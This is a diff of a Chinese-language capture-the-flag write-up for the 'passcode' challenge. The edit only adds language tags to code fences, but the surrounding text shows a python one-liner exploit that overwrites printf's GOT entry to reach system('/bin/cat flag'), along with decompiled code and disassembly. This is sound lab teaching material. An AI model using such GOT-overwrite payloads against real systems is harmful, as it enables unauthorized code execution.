@@ -25,7 +25,7 @@ scanf format %100s可以读取100 byte，正好0x60*"A"+PRINTF_GOT_ADDR也是100
 EXP:  
 python -c "print 'A'*0x60 + '\x00\xa0\x04\x08' + '134514147'" | ./passcode
 
-```
+```c
 unsigned int welcome()
 {
   char v1; // [esp+18h] [ebp-70h]
@@ -57,7 +57,9 @@ int login()
   puts("Login OK!");
   return system("/bin/cat flag");
 }
+```
 
+```asm
 .text:08048564 ; __unwind {
 .text:08048564                 push    ebp
 .text:08048565                 mov     ebp, esp
